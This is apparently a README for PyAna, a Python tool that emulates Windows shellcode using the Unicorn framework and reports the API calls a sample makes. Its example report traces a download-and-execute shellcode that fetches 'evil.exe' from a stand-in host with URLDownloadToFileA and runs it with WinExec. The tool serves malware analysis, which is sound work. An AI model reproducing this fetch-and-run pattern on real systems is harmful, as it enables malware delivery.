#PyAna
PyAna - Analyzing the Windows shellcode.
Using Unicorn Framework for emulating shellcode. PyAna emulate a process on Windows: PEB, TIB, LDR_MODULE to create a emulative environment.

#Usage
* From commandline type: PyAna.py [shellcode]
* Ex: PyAna.py UrlDownloadToFile.sc . Show report:
    -  Emulate w32Shell Start...
    - 0x4014b:	call LoadLibraryA('urlmon')
    - 0x4017a:	call GetTempPathA(len=0x104, buf=0x41fe4)
    - 0x401b2:	call URLDownloadToFileA(Url=http://blahblah.com/evil.exe0,
    LocalPath=c:\users\r06u3\appdata\local\tempdEbW.exe)
    - 0x401bd:	call WinExec('c:\users\r06u3\appdata\local\tempdEbW.exe', 1)
    - 0x401cb:	call ExitProcess(0x755c3a63)
    - Emulation done...

#Dependencies
PyAna depends on :
* [Unicorn Framework] developing by Nguyen Anh Quynh. 
* [pefile] developing by Ero Carrera

#Status
* Implement in Python using Unicorn binding
* Emulating  a simple shellcode: calc, UrlDownloadToFile
* Windows system structure emulator is not completely
* A few of Win32 API hooking

#TODO
* support PE file on Windows
* support unpacking
* apply on fuzzing, exploit detection.

#Under development.
 [//]: # (these are link referrence for dependencies packages)
   [Unicorn Framework]: <http://www.unicorn-engine.org/>
   [pefile]: <https://github.com/erocarrera/pefile>
   